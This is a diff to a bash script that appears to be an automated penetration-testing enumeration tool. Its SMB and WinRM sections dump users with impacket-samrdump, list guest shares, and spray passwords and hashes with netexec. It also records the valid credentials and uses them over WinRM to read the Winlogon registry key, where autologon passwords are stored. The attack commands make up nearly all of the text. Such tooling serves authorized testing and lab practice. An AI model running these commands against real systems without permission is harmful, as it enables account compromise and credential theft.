@@ -154,7 +154,7 @@ smb_enum() {
 				sort -u "$enumx_dir/domains" -o "$enumx_dir/domains" 2>/dev/null
 				echo "$shares" | grep -iE 'READ|WRITE' | sed -E 's/(.*) (READ|WRITE).*/\1/' | awk '{for(i=5;i<=NF;i++) printf $i (i==NF ? "" : " "); print ""}' | tee -a "$enumx_dir/shares"
 				sort -u "$enumx_dir/shares" -o "$enumx_dir/shares" 2>/dev/null
-				echo "$groups" | grep -viE '[*]|[-]' | sed -E '1d'
+				echo "$groups" | grep -viE '[*]|[-]|membercount: 0' | sed -E '1d'
 				echo "$ridbrute" | grep -viE 'erro|│|╭|╰|[*]|[-]' | grep -E '[+]|SidTypeUser' | sed -E '1d'
 				echo "$ridbrute" | grep -iE 'SidTypeUser' | grep -viE 'WINDOWS|\$' | awk '{print $6}' | awk -F'\\' '{print $2}' | grep -viE '\$|error|sm_|mailbox|_denied' | tee -a "$enumx_dir/usernames"
 				sort -fu "$enumx_dir/usernames" -o "$enumx_dir/usernames" 2>/dev/null
@@ -308,6 +308,9 @@ for port in $open_ports; do
             ;;
         139)
             # https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
+            impacket-samrdump "$target" | grep -viE 'comment'
+            impacket-samrdump "$target" | grep -E '(/.*Comment): [^:]'
+            netexec smb "$target" --port "$port" -u "guest" -p "" --shares | tr -d '\0'
        		if [ ! -s "$enumx_dir/creds" ]; then      			
 	       		spray=$(netexec smb "$target" --port "$port" -u "$enumx_dir/usernames" -p "$enumx_dir/passwords" --continue-on-success | grep -viE '\\:' 2>/dev/null)
 	       		echo "$spray" | grep -iE '[+]' | awk '{print $6}' | cut -d'\' -f2- | tee -a "$enumx_dir/creds"
@@ -318,7 +321,6 @@ for port in $open_ports; do
 	       		echo "$hspray" | tee -a "$enumx_dir/hcreds"
 				sort -u "$enumx_dir"/hcreds -o "$enumx_dir"/hcreds 2>/dev/null
 			fi
-			netexec smb "$target" --port "$port" -u "guest" -p "" --shares | tr -d '\0'
           	#while IFS= read -r user; do
           	#	shares=$(netexec smb "$target" --port "$port" -u "$user" -p "" --shares | tr -d '\0')
           	#	echo "$shares"
@@ -383,6 +385,9 @@ for port in $open_ports; do
             ;;
         445)
             # https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
+            impacket-samrdump "$target" | grep -viE 'comment'
+            impacket-samrdump "$target" | grep -E '(/.*Comment): [^:]'
+            netexec smb "$target" --port "$port" -u "guest" -p "" --shares | tr -d '\0'
        		if [ ! -s "$enumx_dir/creds" ]; then      			
 	       		spray=$(netexec smb "$target" --port "$port" -u "$enumx_dir/usernames" -p "$enumx_dir/passwords" --continue-on-success | grep -viE '\\:' 2>/dev/null)
 	       		echo "$spray" | grep -iE '[+]' | awk '{print $6}' | cut -d'\' -f2- | tee -a "$enumx_dir/creds"
@@ -393,7 +398,6 @@ for port in $open_ports; do
 	       		echo "$hspray" | tee -a "$enumx_dir/hcreds"
 				sort -u "$enumx_dir"/hcreds -o "$enumx_dir"/hcreds 2>/dev/null
 			fi
-			netexec smb "$target" --port "$port" -u "guest" -p "" --shares | tr -d '\0'
           	#while IFS= read -r user; do
           	#	shares=$(netexec smb "$target" --port "$port" -u "$user" -p "" --shares | tr -d '\0')
           	#	echo "$shares"
@@ -530,7 +534,7 @@ for port in $open_ports; do
             while IFS= read -r cred; do
                 read credu credp <<< $(echo "$cred" | sed 's/:/ /')
                 if [ -n "$credp" ]; then
-                	nxc winrm "$target" -u "$credu" -p "$credp" -X 'Get-Item -Path "HKLM:\software\microsoft\windows nt\currentversion\winlogon"' | grep -iE 'DefaultPassword|' | sed 's/.*: //' | tee -a "$enumx_dir/passwords"
+                	nxc winrm "$target" -u "$credu" -p "$credp" -X 'Get-Item -Path "HKLM:\software\microsoft\windows nt\currentversion\winlogon"'
                 fi
             done < "$enumx_dir/creds"
             ;;
@@ -539,7 +543,7 @@ for port in $open_ports; do
             while IFS= read -r cred; do
                 read credu credp <<< $(echo "$cred" | sed 's/:/ /')
                 if [ -n "$credp" ]; then
-                	nxc winrm "$target" -u "$credu" -p "$credp" -X 'Get-Item -Path "HKLM:\software\microsoft\windows nt\currentversion\winlogon"' | grep -iE 'DefaultPassword' | sed 's/.*: //' | tee -a "$enumx_dir/passwords"
+                	nxc winrm "$target" -u "$credu" -p "$credp" -X 'Get-Item -Path "HKLM:\software\microsoft\windows nt\currentversion\winlogon"'
                 fi
             done < "$enumx_dir/creds"
             ;;
